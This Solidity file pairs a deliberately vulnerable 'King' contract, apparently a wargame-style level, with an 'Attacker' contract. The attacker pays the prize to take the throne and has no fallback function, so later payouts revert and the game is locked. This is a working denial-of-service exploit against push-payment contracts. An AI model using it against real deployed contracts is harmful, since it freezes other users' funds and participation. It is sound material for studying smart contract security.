// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}

contract Attacker{
    King public victimContract;


    constructor(address payable _victim) payable{
        victimContract = King(_victim);
        uint prize = victimContract.prize();
        (bool success, ) = _victim.call{value: prize}("");
        require(success, "Failed!");

        // not having a fallback ensures we wont allow transfer
    }


    // Helper functions that are not neccessary
    function getPrice() public view returns(uint){
        return victimContract.prize();
    }

    function getOwner() public view returns(address){
        return victimContract.owner();
    }

    function getKing() public view returns(address){
        return victimContract._king();
    }


}